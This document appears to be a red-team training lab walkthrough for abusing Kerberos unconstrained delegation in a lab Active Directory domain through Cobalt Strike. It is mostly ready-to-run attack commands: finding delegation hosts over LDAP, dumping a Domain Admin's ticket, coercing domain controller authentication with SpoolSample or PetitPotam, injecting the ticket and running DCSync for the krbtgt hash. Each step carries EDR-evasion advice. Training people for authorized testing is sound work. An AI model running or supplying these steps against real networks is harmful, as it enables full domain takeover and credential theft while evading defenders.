# Unconstrained Delegation Kerberos Lab  

>The objective of this lab is to abuse unconstrained delegation to obtain the TGT of a domain administrator.  

>Unconstrained delegation allows a service/computer to impersonate any user to any service in the domain.  
>When a user authenticates to a host with unconstrained delegation enabled, their TGT is embedded in the service ticket and cached in LSASS on that host.  
>An attacker who compromises that host can extract those TGTs and reuse them, impersonating any user who authenticated there, including Domain Admins.  
>Unconstrained delegation is the most permissive and dangerous form of delegation because there's no restriction on which services the ticket can be forwarded to.  
  
===

## Enumeration

1. Launch Cobalt Strike and connect to the team server.
2. Use LDAP to find computers configured for unconstrained delegation.

    ```Beacon-nocolor
    ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
    ```

> `OPSEC-SAFE` — ldapsearch runs as a BOF (inline, no child process, no disk write).

⚠️ Domain Controllers always have unconstrained delegation and are not a viable attack path, but you should see an additional machine - *lon-ws-1$*.

1. Impersonate the *rsteel* user and move laterally to *lon-ws-1*.

⚠️ steps to [impersonate user](/labs/User-Impersonation-lab.md)  

===

## Exploitation

Two strategies depending on whether a privileged TGT is already cached or needs to be coerced.

---

### Strategy A — Passive: Harvest Cached TGTs (BOF approach)

Use when a high-value user has already authenticated to the unconstrained delegation host.

On the new Beacon on *lon-ws-1*:

1. Triage tickets — runs as BOF, no process spawn.

    ```Beacon-nocolor
    krb_triage
    ```

    > `OPSEC-SAFE` — BOF runs in beacon thread via `inline-execute`. No child process spawned.

⚠️ You should see at least one from **dyork@CONTOSO.COM**.

2. Confirm that dyork is a Domain Admin.

    ```Beacon-nocolor
    ldapsearch samAccountName=dyork --attributes memberOf
    ```

3. Dump the TGT via BOF (uses `LsaCallAuthenticationPackage` Kerberos API — not a raw LSASS memory read).

    ```Beacon-nocolor
    krb_dump /user:dyork /service:krbtgt
    ```

    > `OPSEC-CAUTION` — Interacts with LSASS via the Kerberos API (LsaCallAuthenticationPackage / KerbRetrieveEncodedTicketMessage). Less noisy than sekurlsa / direct LSASS read, but LSASS is still the endpoint. EDR hooks on LsaCallAuthenticationPackage will see this call.

4. Use the TGT to impersonate dyork and list the C$ share on *lon-dc-1*.

⚠️ steps to [impersonate user](/labs/User-Impersonation-lab.md)

---

### Strategy B — Active: Coerce Authentication via Printer Bug (SpoolSample)

Use when no high-value TGT is cached — force a DC or DA workstation to send its TGT to your controlled host.  
Combining coercion with `Rubeus monitor` captures the ticket via SSPI **before** it is written to the LSASS cache, avoiding any LSASS interaction entirely.

#### Step 1 — Start Rubeus monitor on the unconstrained delegation host

On the beacon running as SYSTEM on *lon-ws-1*, launch Rubeus monitor in a background job:

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus.exe monitor /interval:5 /nowrap /filteruser:lon-dc-1$
```

> `OPSEC-CAUTION` — `execute-assembly` uses fork-and-run (spawns sacrificial process configured by `spawnto`). Ticket capture itself uses Windows SSPI/Kerberos API — no LSASS memory read. Set `spawnto` to `dllhost.exe` in your malleable profile before running.

⚠️ `/filteruser` limits capture to the target computer account TGT only — reduces noise and output volume.

#### Step 2 — Trigger coercion from a beacon on any domain-joined host

**Option 1 — MS-RPRN (SpoolSample / PrinterBug):**

```Beacon-nocolor
execute-assembly C:\Tools\SpoolSample\SpoolSample.exe lon-dc-1 lon-ws-1
```

> `OPSEC-CAUTION` — Makes an authenticated RPC call to the Print Spooler service (`MS-RPRN`) on the target DC. Generates a 4648 logon event on the DC. Print Spooler must be running on the target (enabled by default on DCs in older environments).

**Option 2 — MS-EFSR (PetitPotam):**

```Beacon-nocolor
execute-assembly C:\Tools\PetitPotam\PetitPotam.exe lon-ws-1 lon-dc-1
```

> `OPSEC-CAUTION` — Uses EfsRpc (MS-EFSR) to coerce DC authentication. Does not require Print Spooler. Generates EFS-related 5145 / NTLM auth events. Blocked by newer patches if EfsRpc is filtered, but `EfsRpcOpenFileRaw` alternatives exist.

#### Step 3 — Capture and import the TGT

Rubeus monitor output will display the base64-encoded TGT for `lon-dc-1$`.

Inject the captured TGT directly into a sacrificial logon session without writing to disk:

```Beacon-nocolor
make_token CONTOSO\FakeUser FakePass
kerberos_ticket_use <base64-ticket-from-rubeus-monitor>
```

> `OPSEC-SAFE` — `kerberos_ticket_use` injects the ticket into the current beacon token context in-memory. No disk write. No child process.

#### Step 4 — DCSync using the DC machine account TGT

With the DC$ TGT injected, perform DCSync to extract the krbtgt hash:

```Beacon-nocolor
dcsync CONTOSO\krbtgt
```

> `OPSEC-CAUTION` — DCSync generates a replication event (EventID 4662) on the DC. Defender for Identity / MDI will alert on replication requests from non-DC accounts. Avoid running this from a user account beacon if MDI is present; use the DC$ TGT to make it appear as legitimate replication traffic.

---

### OPSEC Comparison — TGT Extraction Methods

| Method | LSASS touch | Process spawn | Disk write | Noise level |
|--------|-------------|---------------|------------|-------------|
| `krb_dump` BOF | API (LsaCallAuthenticationPackage) | No (BOF) | No | CAUTION |
| `Rubeus dump` | API (SSPI) | Yes (fork & run) | No | CAUTION |
| `Rubeus monitor` + coercion | None | Yes (fork & run) | No | CAUTION (coercion generates auth events) |
| `mimikatz sekurlsa` | Direct read | Yes | No | UNSAFE |

**Exam recommendation:** Prefer `Rubeus monitor` + coercion (`SpoolSample` or `PetitPotam`) when you can control the timing. Use `krb_dump` BOF only when the TGT is already cached and you need it immediately. Never use `mimikatz sekurlsa` — flag the OPSEC cost before the exam grader does.

---

⚠️ In this lab, you have learned how to abuse unconstrained delegation to capture the TGT of another user using both passive harvest (BOF) and active coercion (SpoolSample / PetitPotam + Rubeus monitor), and how to inject and use the ticket without touching LSASS memory directly.
